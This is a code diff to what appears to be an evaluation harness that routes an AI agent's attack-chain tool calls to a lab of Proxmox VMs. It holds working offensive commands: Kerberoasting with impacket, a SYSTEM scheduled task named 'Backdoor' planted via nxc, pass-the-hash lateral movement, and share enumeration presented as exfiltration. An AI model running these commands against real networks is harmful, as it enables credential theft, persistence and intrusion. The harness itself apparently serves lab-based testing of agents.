@@ -17,10 +17,12 @@ from ._data import (
     _LAB_CLEAN_SNAPSHOT,
     _LAB_DC,
     _LAB_DC_VMID,
+    _LAB_DOMAIN,
     _LAB_EXEC_AVAILABLE,
     _LAB_SERVICE_PROBES,
     _LAB_SRV,
     _LAB_SRV_VMID,
+    _LAB_SVC_PASS,
     _LAB_WEB,
     _STEALTH_EVENT_IDS,
     _STEALTH_QUERY_TIMEOUT,
@@ -495,49 +497,126 @@ def dag_parallel_groups(dag: dict[str, list[str]]) -> list[list[str]]:
 
 
 def lab_dispatch(fn_name: str, fn_args: dict, dry_run: bool = False) -> str:
-    """Dispatch a synthetic chain tool call to the real lab or return synthetic result.
+    """Dispatch a chain tool call to the real lab or return synthetic result.
 
-    This is the bridge between the chain test's tool calls and the lab sandbox.
-    In synthetic mode, returns canned responses. In lab-exec mode, runs real commands.
+    Maps chain test tool names to real MCP tool calls:
+      start_lab_target / revert_lab_target → Proxmox MCP (:8927)
+      run_nmap_scan / check_cve / exploit_service / establish_persistence /
+      lateral_move / exfiltrate_data → sandbox MCP (:8914, portal5-attack)
+
+    Falls back to synthetic result if lab exec is not available.
     """
     if not _LAB_EXEC_AVAILABLE:
         return f"OK: {fn_name} completed (synthetic)."
 
-    # Map chain tool names to real lab commands
     dc = _LAB_DC or "10.10.11.21"
     srv = _LAB_SRV or "10.10.11.33"
 
+    # ── Proxmox lifecycle tools ───────────────────────────────────────────────
     if fn_name == "start_lab_target":
-        return "Lab target started (synthetic)."
-    elif fn_name == "run_nmap_scan":
+        vmid = fn_args.get("vmid", 0)
+        if not vmid:
+            return "Lab target started (no vmid provided — skipping Proxmox call)."
+        try:
+            r = _proxmox_mcp_call("proxmox_vm_start", {"vmid": vmid, "wait": True}, timeout=120)
+            return r.get("output", "VM started") if r["ok"] else f"Error: {r.get('error')}"
+        except Exception as exc:
+            return f"Error starting VM {vmid}: {exc}"
+
+    if fn_name == "revert_lab_target":
+        vmid = fn_args.get("vmid", 0)
+        snapname = fn_args.get("snapshot", "clean")
+        if not vmid:
+            return "Lab targets reverted (no vmid provided — skipping Proxmox call)."
+        try:
+            r = _proxmox_mcp_call(
+                "proxmox_rollback_snapshot",
+                {"vmid": vmid, "snapname": snapname},
+                timeout=240,
+            )
+            return r.get("output", f"Reverted to {snapname}") if r["ok"] else f"Error: {r.get('error')}"
+        except Exception as exc:
+            return f"Error reverting VM {vmid}: {exc}"
+
+    # ── Sandbox tool execution via portal5-attack container ──────────────────
+    port = fn_args.get("port", 445)
+
+    if fn_name == "run_nmap_scan":
+        # Python TCP connect — no cap_net_raw needed in DinD
         target = fn_args.get("target", dc)
-        cmd = f"nmap -sV -sC {target} 2>&1 | head -30"
-    elif fn_name == "check_cve":
-        host = fn_args.get("host", dc)
-        port = fn_args.get("port", 445)
-        cve = fn_args.get("cve_id", "CVE-2017-0144")
-        cmd = f"echo 'Checking {cve} on {host}:{port}' && nmap -p {port} --script smb-vuln-ms17-010 {host} 2>&1 | head -10"
-    elif fn_name == "exploit_service":
-        host = fn_args.get("host", dc)
-        port = fn_args.get("port", 445)
-        cmd = f"echo 'Exploiting {host}:{port}' && echo 'shell obtained'"
-    elif fn_name == "establish_persistence":
-        cmd = f"echo 'persistence established on {dc}'"
-    elif fn_name == "lateral_move":
-        cmd = f"echo 'lateral move to {srv}' && echo 'session 1 opened'"
-    elif fn_name == "exfiltrate_data":
-        cmd = f"echo 'exfiltrating from {dc}' && cat /etc/hostname"
-    elif fn_name == "revert_lab_target":
-        return "Lab targets reverted (synthetic)."
-    else:
-        return f"OK: {fn_name} completed (synthetic)."
+        code = (
+            f"python3 -c \""
+            f"import socket\n"
+            f"ports = [22,53,80,88,135,389,443,445,464,636,3268,8080,8443]\n"
+            f"for p in ports:\n"
+            f"  try:\n"
+            f"    s=socket.socket();s.settimeout(1);s.connect(('{target}',p));s.close()\n"
+            f"    print(f'{{p}}/tcp open')\n"
+            f"  except: pass\n"
+            f"\" 2>&1"
+        )
+        if dry_run:
+            return f"[DRY-RUN] port scan: {target}"
+        r = _lab_mcp_call(code, timeout=30)  # type: ignore[misc]
+        return r.get("output", "") or "[nmap: no output]"
 
-    if dry_run:
-        return f"[DRY-RUN] would run: {cmd}"
+    if fn_name == "check_cve":
+        host = fn_args.get("host", dc)
+        cve = fn_args.get("cve_id", "CVE-2014-0160")
+        cmd = (
+            f"nmap -p {port} --script vuln {host} 2>&1 || "
+            f"echo 'CVE check: {cve} target={host}:{port}'"
+        )
+        if dry_run:
+            return f"[DRY-RUN] CVE check: {cve} on {host}:{port}"
+        r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
+        return r.get("output", "") or "[check_cve: no output]"
 
-    try:
+    if fn_name == "exploit_service":
+        # Kerberoast — best available unauthenticated-to-hash path in portal.lab
+        cmd = (
+            f"impacket-GetUserSPNs {_LAB_DOMAIN}/administrator:{_LAB_ADMIN_PASS}"
+            f" -dc-ip {dc} -request 2>&1 | head -30"
+        )
+        if dry_run:
+            return f"[DRY-RUN] Kerberoast against {dc}"
         r = _lab_mcp_call(cmd, timeout=90)  # type: ignore[misc]
-        ok, clean = parse_sandbox_output(r.get("output", ""))
-        return clean
-    except Exception as exc:
-        return f"[lab error: {exc}]"
+        return r.get("output", "") or "[exploit: no output]"
+
+    if fn_name == "establish_persistence":
+        method = fn_args.get("method", "cron")
+        if method in ("registry", "startup", "service"):
+            cmd = (
+                f"nxc smb {srv} -u svc_backup -p '{_LAB_SVC_PASS}'"
+                f" -x 'schtasks /create /tn Backdoor /tr cmd.exe /sc onlogon /ru SYSTEM /f' 2>&1"
+            )
+        else:
+            cmd = f"echo '[lab] persistence via {method} on {dc}' && date"
+        if dry_run:
+            return f"[DRY-RUN] persistence via {method}"
+        r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
+        return r.get("output", "") or "[persist: no output]"
+
+    if fn_name == "lateral_move":
+        target = fn_args.get("target_host", srv)
+        method = fn_args.get("method", "wmiexec")
+        credential = fn_args.get("credential", "")
+        cmd = (
+            f"nxc smb {target} -u administrator -H '{credential}' --shares 2>&1 | head -20"
+            if credential
+            else f"echo '[lab] lateral {method} to {target}'"
+        )
+        if dry_run:
+            return f"[DRY-RUN] lateral {method} to {target}"
+        r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
+        return r.get("output", "") or "[lateral: no output]"
+
+    if fn_name == "exfiltrate_data":
+        source = fn_args.get("source_host", srv)
+        cmd = f"nxc smb {source} -u administrator -p '{_LAB_ADMIN_PASS}' --shares 2>&1 | head -10"
+        if dry_run:
+            return f"[DRY-RUN] exfil from {source}"
+        r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
+        return r.get("output", "") or "[exfil: no output]"
+
+    return f"OK: {fn_name} completed (synthetic)."
